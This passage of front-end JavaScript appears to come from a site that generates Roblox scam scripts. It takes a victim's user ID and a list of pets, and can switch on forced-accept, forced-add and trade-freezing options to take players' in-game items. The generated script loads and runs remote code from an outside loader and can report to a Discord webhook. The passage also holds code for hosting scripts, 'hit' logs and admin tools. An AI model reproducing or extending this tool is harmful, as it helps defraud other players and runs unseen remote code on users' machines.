                                ${isCurrentUserOwner ? `<button onclick="deleteGlobalLog(${log.timestamp})" style="background: rgba(248,113,113,.1); border: 1px solid rgba(248,113,113,.3); color: #ff4444; border-radius: 4px; padding: 3px 8px; font-size: 9px; font-weight: bold; cursor: pointer; margin-top: 4px; transition: 0.2s;">DELETE</button>` : ''}
                            </div>
                        </div>
                    `;
                });

                if (container.dataset.lastContent !== htmlContent) {
                    container.innerHTML = htmlContent;
                    container.dataset.lastContent = htmlContent;
                }
            } catch (e) {}
        }

        // Always check for logs in the background so the sound works anywhere!
        setInterval(() => {
            fetchGlobalLogs();
            fetchMyLogs();

            // Ping server to stay online and get user count
            fetch('/api/ping')
                .then(async r => {
                    // IF BANNED WHILE ON THE SITE, RELOAD TO TRIGGER THE LOCKOUT SCREEN
                    if (r.status === 403) {
                        const err = await r.json();
                        if (err.blacklisted) window.location.reload();
                    }
                    return r.json();
                })
                .then(d => {
                    if(d && d.online !== undefined) document.getElementById('onlineCount').innerText = d.online;
                }).catch(()=>{});
        }, 1500);

        function initApp() {
            renderDropdownList(ALL_PETS);
            loadCredits();
            loadDiscordInvites();

            let path = window.location.pathname.replace('/', '');
            if (path === '') path = 'generator';

            const validTabs = ['generator', 'logs', 'mylogs', 'tutorial', 'credits', 'admin'];
            if (validTabs.includes(path)) {
                switchTab(path, false);
                if (path === 'logs') fetchGlobalLogs();
                if (path === 'mylogs') fetchMyLogs();
            }
        }

        function switchTab(tabId, updateUrl = true) {
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.nav-btn').forEach(b => {
                b.classList.remove('active');
                if (b.getAttribute('onclick') && b.getAttribute('onclick').includes("'" + tabId + "'")) {
                    b.classList.add('active');
                }
            });
            document.getElementById(tabId).classList.add('active');

            if (updateUrl) {
                window.history.pushState({}, '', '/' + tabId);
            }
        }

        function setMode(btn, mode, index) {
            document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            scriptMode = mode;
            document.getElementById('modeSlider').style.transform = `translateX(${index * 100}%)`;

            const customSettings = document.getElementById('customSettings');
            if (mode === 'CUSTOM') {
                customSettings.classList.add('show');
            } else {
                customSettings.classList.remove('show');
            }
        }

        function debounceFetchId() {
            clearTimeout(fetchTimer);
            const user = document.getElementById('rbxInput').value.trim();
            const card = document.getElementById('rbxUserCard');
            const status = document.getElementById('idStatus');

            if(user.length < 3) {
                card.style.display = 'none';
                status.innerText = "";
                targetId = "123456789";
                return;
            }

            status.innerText = "Resolving User...";
            status.style.color = "var(--dim)";

            fetchTimer = setTimeout(async () => {
                try {
                    const res = await fetch(`/api/roblox/user/${user}`);
                    if (!res.ok) throw new Error("Not found");
                    const data = await res.json();

                    if(data.id) {
                        targetId = data.id;
                        document.getElementById('rbxAvatar').src = data.avatar;
                        document.getElementById('rbxDisplay').innerText = data.displayName;
                        document.getElementById('rbxName').innerText = "@" + data.username;
                        document.getElementById('rbxBadge').innerText = data.id;

                        card.style.display = 'flex';
                        status.innerText = "Verified.";
                        status.style.color = "var(--ok)";
                    }
                } catch(e) {
                    card.style.display = 'none';
                    targetId = "123456789";
                    status.innerText = "User not found.";
                    status.style.color = "var(--err)";
                }
            }, 200);
        }

        function filterPets() {
            const rawQuery = document.getElementById('petSearch').value.toLowerCase().trim();

            if (!rawQuery) {
                renderDropdownList(ALL_PETS);
                return;
            }

            const searchTerms = rawQuery.split(/\s+/);
            let filteredPets = ALL_PETS.filter(p => {
                const lowerPet = p.toLowerCase();
                return searchTerms.every(term => lowerPet.includes(term));
            });

            filteredPets.sort((a, b) => {
                const aLower = a.toLowerCase();
                const bLower = b.toLowerCase();
                const primaryTerm = searchTerms[0];

                const aStarts = aLower.startsWith(primaryTerm);
                const bStarts = bLower.startsWith(primaryTerm);

                if (aStarts && !bStarts) return -1;
                if (!aStarts && bStarts) return 1;
                return a.localeCompare(b);
            });

            renderDropdownList(filteredPets);
        }

        function renderDropdownList(list) {
            const container = document.getElementById('petListContainer');
            container.innerHTML = '';
            list.forEach(p => {
                const label = document.createElement('label');
                label.className = 'pet-item';
                const isChecked = selectedPets.has(p) ? 'checked' : '';
                label.innerHTML = `<div class="pet-item-left"><input type="checkbox" value="${p}" ${isChecked} onchange="togglePet(this, '${p}')"><span>${p}</span></div>`;
                container.appendChild(label);
            });
        }

        function togglePet(cb, name) {
            if (cb.checked) {
                selectedPets.add(name);
            } else {
                selectedPets.delete(name);
            }
            updateTags();
        }

        function removePet(name) {
            selectedPets.delete(name);
            const cb = document.querySelector(`input[value="${name}"]`);
            if(cb) cb.checked = false;
            updateTags();
        }

        function updateTags() {
            const petCount = selectedPets.size;
            document.getElementById('selectedCount').innerText = petCount === 0 ? "0 selected" : `${petCount} selected`;
            const tc = document.getElementById('tagsContainer');
            tc.innerHTML = '';
            selectedPets.forEach(p => {
                const t = document.createElement('div');
                t.className = 'tag-pill';
                t.innerHTML = `<span>${p}</span><span class="tag-close" onclick="removePet('${p}')"><svg width="14" height="14" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></span>`;
                tc.appendChild(t);
            });
        }

        function selectAllSecrets() {
            SECRET_PETS.forEach(pet => {
                if (ALL_PETS.includes(pet)) {
                    selectedPets.add(pet);
                    const cb = document.querySelector(`input[value="${pet}"]`);
                    if (cb) cb.checked = true;
                }
            });
            updateTags();
        }

        async function generateScript() {
            const outputBlock = document.getElementById('codeOutput');
            const copyBtn = document.getElementById('copyBtn');
            const webhookUrl = document.getElementById('webhook').value.trim();

            if (selectedPets.size === 0) {
                document.getElementById('outputPlaceholder').style.display = 'none';
                outputBlock.style.display = 'block';
                copyBtn.style.display = 'none';
                outputBlock.innerHTML = '<span style="color: var(--err); font-weight: bold;">[ERROR] No target brainrots selected. Please try again.</span>';
                return;
            }

            document.getElementById('outputPlaceholder').style.display = 'none';
            outputBlock.style.display = 'block';
            copyBtn.style.display = 'none';
            outputBlock.innerHTML = '<span style="color: var(--dim);">Generating script...</span>';

            let petsLua = "";
            selectedPets.forEach(p => {
                petsLua += `    ["${p}"] = true,\n`;
            });

            let webhookLine = "";
            if (webhookUrl.startsWith("https://discord.com/api/webhooks/")) {
                webhookLine = `getgenv().WEBHOOK_URL = "${webhookUrl}"\n`;
            }

            let modeLines = "";
            if (scriptMode === "FREEZE") {
                modeLines = `getgenv().FREEZE = true\n`;
            } else if (scriptMode === "CUSTOM") {
                const doFreeze = document.getElementById('toggleFreeze').checked;
                const doAccept = document.getElementById('toggleAccept').checked;
                const doAdd = document.getElementById('toggleAdd').checked;

                if (doFreeze) modeLines += `getgenv().FREEZE_TRADE = true\n`;
                if (doAccept) modeLines += `getgenv().FORCE_ACCEPT = true\n`;
                if (doAdd) modeLines += `getgenv().FORCE_ADD = true\n`;
            }

            // INJECT SECRET KEY INTO THE LUA SCRIPT HERE
            const secretKeyLine = userSecretKey ? `getgenv().SECRET_KEY = "${userSecretKey}"\n` : '';

            const rawLuaCode = `${secretKeyLine}getgenv().TARGET_ID = ${targetId}\ngetgenv().DELAY_STEP = 1\ngetgenv().TRADE_CYCLE_DELAY = 2\n${webhookLine}${modeLines}getgenv().TARGET_BRAINROTS = {\n${petsLua}}\nloadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/acf7b7f9c982b6779f2b2cbad250ea58.lua"))()`;

            const toggleHostEl = document.getElementById('toggleHost');
            const doHost = toggleHostEl ? toggleHostEl.checked : false;

            if (doHost) {
                try {
                    outputBlock.innerHTML = '<span style="color: var(--dim);">Uploading to IceHub Cloud...</span>';
                    const res = await fetch('/api/host', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ code: rawLuaCode })
                    });

                    if (!res.ok) {
                        const errData = await res.json();
                        outputBlock.innerHTML = `<span style="color: var(--err); font-weight: bold;">[ERROR] ${errData.error || 'Server error.'}</span>`;
                        return;
                    }

                    const data = await res.json();

                    if (data.error) {
                        outputBlock.innerHTML = `<span style="color: var(--err); font-weight: bold;">[ERROR] ${data.error}</span>`;
                        return;
                    }

                    const loaderCode = `loadstring(game:HttpGet("${data.url || window.location.origin + '/raw/' + data.id}"))()`;
                    rawCodeToCopy = loaderCode;
                    outputBlock.innerHTML = formatCode(loaderCode);
                    copyBtn.style.display = 'block';

                } catch (e) {
                    outputBlock.innerHTML = '<span style="color: var(--err); font-weight: bold;">[ERROR] Failed to contact IceHub Cloud. Ensure the server is running.</span>';
                    return;
                }
            } else {
                rawCodeToCopy = rawLuaCode;
                outputBlock.innerHTML = formatCode(rawLuaCode);
                copyBtn.style.display = 'block';
            }
        }

        function convertLoadstring() {
            const inputField = document.getElementById('pastefyInput');
            const url = inputField.value.trim();
            const outputBlock = document.getElementById('codeOutput');
            const placeholder = document.getElementById('outputPlaceholder');
            const copyBtn = document.getElementById('copyBtn');

            if (!url) {
                alert("Please paste a Pastefy link first.");
                return;
            }

            const match = url.match(/pastefy\.app\/(?:raw\/)?([a-zA-Z0-9]+)(?:\/raw)?/);

            if (!match || !match[1]) {
                alert("Invalid Pastefy URL.");
                return;
            }

            const pasteId = match[1];
            const rawUrl = `https://pastefy.app/${pasteId}/raw`;

            const loaderCode = `loadstring(game:HttpGet("${rawUrl}"))()`;
            rawCodeToCopy = loaderCode;

            placeholder.style.display = 'none';
            outputBlock.style.display = 'block';

            outputBlock.innerHTML = formatCode(loaderCode);
            copyBtn.style.display = 'block';
            inputField.value = '';
        }

        function formatCode(luaCode) {
            return luaCode
                .replace(/(".*?")/g, '<span class="c-string">$1</span>')
                .replace(/(\b\d+\b)/g, '<span class="c-num">$1</span>')
                .replace(/(getgenv|loadstring|game|HttpGet|true)/g, '<span class="c-key">$1</span>');
        }

        // New Custom Notification System
        function showToast(message, type = 'success') {
            const t = document.getElementById('toast');
            let icon = type === 'success'
                ? '<svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path></svg>'
                : '<svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>';

            t.innerHTML = `${icon} <span style="margin-left:8px; font-weight: 600;">${message}</span>`;
            t.style.backgroundColor = type === 'success' ? '#10b981' : '#ef4444'; // Green for success, Red for errors
            t.style.color = '#fff';
            t.style.display = 'flex';
            t.classList.add('show');
            setTimeout(() => t.classList.remove('show'), 3000);
        }

        function copyCode() {
            navigator.clipboard.writeText(rawCodeToCopy).then(() => {
                showToast('Copied to clipboard!', 'success');
            });
        }

        function openImageModal(imgSrc) {
            const modal = document.getElementById('imageModal');
            const modalImg = document.getElementById('modalImage');
            modalImg.src = imgSrc;
            modal.classList.add('show');
            modalImg.style.transform = 'scale(1)';
            modalImg.dataset.zoomed = "false";
            modalImg.style.cursor = "zoom-in";
            document.body.style.overflow = 'hidden';
        }

        function closeImageModal(e) {
            if (e.target.id === 'imageModal' || e.target.classList.contains('close-modal')) {
                const modal = document.getElementById('imageModal');
                modal.classList.remove('show');
                document.body.style.overflow = 'auto';
            }
        }

        function toggleZoom(e) {
            const img = e.target;
            if (img.dataset.zoomed === "true") {
                img.style.transform = "scale(1)";
                img.dataset.zoomed = "false";
                img.style.cursor = "zoom-in";
            } else {
                img.style.transform = "scale(1.6)";
                img.dataset.zoomed = "true";
                img.style.cursor = "zoom-out";
            }
        }

        document.addEventListener('keydown', function(event) {
            if (event.key === "Escape") {
                const modal = document.getElementById('imageModal');
                if (modal.classList.contains('show')) {
                    modal.classList.remove('show');
                    document.body.style.overflow = 'auto';
                }
            }
        });

        async function loadCredits() {
            const ids = ['1426302178024231043', '1435374811957170347'];
            const cardIds = ['dev1', 'dev2'];

            try {
                // Fire both requests to your server at the EXACT SAME TIME (2x faster)
                const requests = ids.map(id => fetch(`/api/discord/user/${id}`));
                const responses = await Promise.all(requests);

                for(let i=0; i<2; i++) {
                    const res = responses[i];
                    if (!res.ok) continue; // If one errors out, skip it without breaking the other

                    const user = await res.json();
                    const card = document.getElementById(cardIds[i]);

                    if(user.username) {
                        document.getElementById(`${cardIds[i]}Name`).innerText = user.global_name || user.username;
                        document.getElementById(`${cardIds[i]}Pfp`).style.display = 'block';

                        if(OWNER_IDS.includes(user.id)) {
                            document.getElementById(`${cardIds[i]}Badge`).innerText = "OWNER";
                        }
                    }
                    if (user.avatar) {
                        document.getElementById(`${cardIds[i]}Pfp`).src = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=256`;
                    }
                    if (user.banner) {
                        card.querySelector('.dev-banner').style.backgroundImage = `url(https://cdn.discordapp.com/banners/${user.id}/${user.banner}.png?size=600)`;
                    } else if (user.accent_color) {
                        card.querySelector('.dev-banner').style.backgroundColor = '#' + user.accent_color.toString(16).padStart(6, '0');
                    }
                }
            } catch(e) {
                console.error("Credits load failed");
            }
        }

        async function fetchDiscordInvite(inviteCode, iconId, nameId, onlineId, totalId) {
            try {
                const res = await fetch(`https://discord.com/api/v9/invites/${inviteCode}?with_counts=true`);
                if (!res.ok) throw new Error("Invite fetch failed");
                const data = await res.json();

                if (data.guild && data.guild.name) {
                    document.getElementById(nameId).innerText = data.guild.name;
                    if (data.guild.icon) {
                        const ext = data.guild.icon.startsWith('a_') ? 'gif' : 'png';
                        document.getElementById(iconId).src = `https://cdn.discordapp.com/icons/${data.guild.id}/${data.guild.icon}.${ext}?size=128`;
                    }
                }

                if (data.approximate_presence_count !== undefined) {
                    document.getElementById(onlineId).innerText = `${data.approximate_presence_count.toLocaleString()} Online`;
                }
                if (data.approximate_member_count !== undefined) {
                    document.getElementById(totalId).innerText = `${data.approximate_member_count.toLocaleString()} Members`;
                }
            } catch (e) {}
        }

        function loadDiscordInvites() {
            fetchDiscordInvite('sabscripts', 'inviteIcon1', 'inviteName1', 'inviteOnline1', 'inviteTotal1');
            fetchDiscordInvite('icehub', 'inviteIcon2', 'inviteName2', 'inviteOnline2', 'inviteTotal2');
        }
        let lastAnnouncementId = 0;
        async function fetchAnnouncement() {
            try {
                const res = await fetch('/api/announcement');
                const data = await res.json();
                const banner = document.getElementById('globalBanner');

                // Only trigger if it's a NEW announcement and isn't empty
                if (data.id && data.id !== lastAnnouncementId && data.text.trim() !== "") {
                    lastAnnouncementId = data.id;
                    document.getElementById('bannerText').innerText = data.text;

                    // Reset animation
                    banner.style.display = 'none';
                    void banner.offsetWidth; // Trigger reflow to restart animation
                    banner.style.display = 'flex';
                    banner.classList.add('admin-banner-anim');

                    // Remove after animation finishes (4s)
                    setTimeout(() => {
                        banner.style.display = 'none';
                        banner.classList.remove('admin-banner-anim');
                    }, 4000);
                }
            } catch(e) {}
        }

        async function setAnnouncement() {
            const text = document.getElementById('announcementInput').value;
            const res = await fetch('/api/admin/announcement', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ text })
            });
            const data = await res.json();
            if(data.success) {
                showToast("Announcement broadcasted!", "success");
                document.getElementById('announcementInput').value = '';
                fetchAnnouncement();
            } else {
                showToast(data.error, "error");
            }
        }

        async function handleBlacklist(action) {
            const userId = document.getElementById('blacklistInput').value.trim();
            const reason = document.getElementById('blacklistReason').value.trim();
            if (!userId) return showToast("Enter a Discord ID.", "error");
            if (OWNER_IDS.includes(userId)) return showToast("You cannot blacklist an owner.", "error");

            const res = await fetch('/api/admin/blacklist', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ userId, reason, action })
            });
            const data = await res.json();
            if(data.success) {
                showToast(data.message, "success");
                if(action === 'ban') {
                    document.getElementById('blacklistInput').value = '';
                    document.getElementById('blacklistReason').value = '';
                }
            } else {
                showToast(data.error, "error");
            }
        }

        async function clearGlobalLogs() {
            if (!confirm("Are you SURE you want to wipe the global database? This affects everyone.")) return;
            const res = await fetch('/api/admin/clear-logs', { method: 'POST' });
            const data = await res.json();
            if(data.success) {
                showToast("Global logs wiped.", "success");
                fetchGlobalLogs();
            } else {
                showToast(data.error, "error");
            }
        }

        async function deleteGlobalLog(timestamp) {
            if (!confirm("Delete this log?")) return;
            const res = await fetch('/api/admin/delete-log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ timestamp })
            });
            const data = await res.json();
            if(data.success) {
                showToast("Log deleted.", "success");
                fetchGlobalLogs(); // Refresh immediately
            } else {
                showToast(data.error, "error");
            }
        }

        checkAuth();
    </script>
